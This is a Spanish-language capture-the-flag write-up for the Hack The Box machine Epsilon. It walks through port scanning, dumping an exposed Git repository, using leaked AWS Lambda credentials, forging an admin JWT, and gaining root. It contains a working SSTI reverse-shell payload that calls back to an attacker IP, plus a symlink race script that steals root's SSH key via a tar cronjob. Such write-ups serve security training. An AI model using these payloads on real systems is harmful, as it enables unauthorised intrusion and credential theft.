Overview

Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Durante la enumeración se descubren credenciales de AWS Lambda filtradas en commits anteriores. Con estas credenciales, obtenemos la clave secreta utilizada para firmar JWTs en la aplicación Flask, lo que permite generar cookies de administrador y acceder a rutas protegidas. Finalmente, se obtiene acceso root explotando un cronjob que ejecuta tar -h, permitiendo reemplazar archivos críticos mediante enlaces simbólicos.

Key steps

  1. Escaneo de puertos completo con nmap.
  2. Escaneo detallado de los puertos abiertos para identificación de versiones y servicios.
  3. Enumeración de la aplicación web y descarga del repositorio Git.
  4. Revisión de commits antiguos para extraer credenciales de AWS Lambda.
  5. Generación de un token JWT de administrador para acceso a rutas protegidas.
  6. Explotación SSTI en Flask para obtener shell inicial.
  7. Escalada de privilegios usando cronjob con tar -h y enlaces simbólicos.

1. Port enumeration

Primero identificamos los servicios expuestos en la máquina objetivo. Se realiza un escaneo SYN de todos los puertos TCP:

sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts

Resultados:

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5000/tcp open   upnp

Interpretación: hay un servidor SSH para acceso remoto, un sitio web público en el puerto 80 y otra aplicación HTTP en el puerto 5000.

Luego, realizamos un escaneo más detallado de los puertos abiertos para identificar versiones y servicios:

sudo nmap -p22,80,5000 -sCV -n -vvv 10.10.11.134 -oN infoPorts

Resultados con detección de versiones:

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-git: Git repository found at /.git/
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop

2. HTTP enumeration and Git repository dump

Visitando http://10.10.11.134 obtenemos un 403. Se comprueba si el repositorio Git está expuesto en /.git usando gitdumper:

./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo

Esto permite obtener la historia de commits, archivos y credenciales filtradas.

Revisión de commits antiguos

Los archivos actuales no revelan credenciales, por lo que revisamos commits anteriores:

cd ~/CTF/Epsilon/loot/epsilon-repo
git log --oneline --graph --all
git log -p > ../commits_diff.txt
cat ../commits_diff.txt

Se encuentran credenciales de AWS Lambda en un commit antiguo:

      region_name='us-east-1',

)

3. AWS Lambda enumeration

Configuramos AWS CLI con las credenciales obtenidas:

aws configure
# aws_access_key_id y aws_secret_access_key
# región: us-east-1

Listamos funciones Lambda:

aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions

Descargamos el código de la función:

aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
wget http://cloud.epsilon.htb/path/to/code.zip
unzip code.zip
cat lambda_function.py

Se encuentra la clave secreta usada para firmar JWTs.

4. Explotación y acceso inicial

Generamos un JWT de administrador usando PyJWT:

import jwt
secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
print(token)

Se coloca este token en la cookie auth para acceder a rutas administrativas:

curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home

La misma cookie funciona para http://epsilon.htb:5000/home.

SSTI en Flask

En /order, los campos son evaluados con render_template_string, permitiendo SSTI. Probamos:

{{ 3*3 }}

Se obtiene 9, confirmando la vulnerabilidad.

Para un reverse shell:

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}

Se obtiene shell y el primer flag (user.txt).

5. Escalada de privilegios

Usando pspy, encontramos un cronjob que ejecuta tar -h cada 5 segundos:

#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

Abusamos de -h para reemplazar archivos críticos mediante enlaces simbólicos:

#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
        break
    fi; 
done

Cuando el cronjob vuelve a archivar con -h, la clave privada de root se copia a una ubicación accesible.

Ejemplo de extracción de id_rsa:

cd /tmp
./root.sh
cd /var/backups/web_backups
cp 503891800.tar /tmp
cd /tmp
tar -xf 503891800.tar
cd opt/backups
cat checksum  # Contiene la id_rsa

Finalmente, se conecta vía SSH como root:

ssh -i id_rsa root@10.10.11.134

Se obtiene acceso completo a la máquina Epsilon.
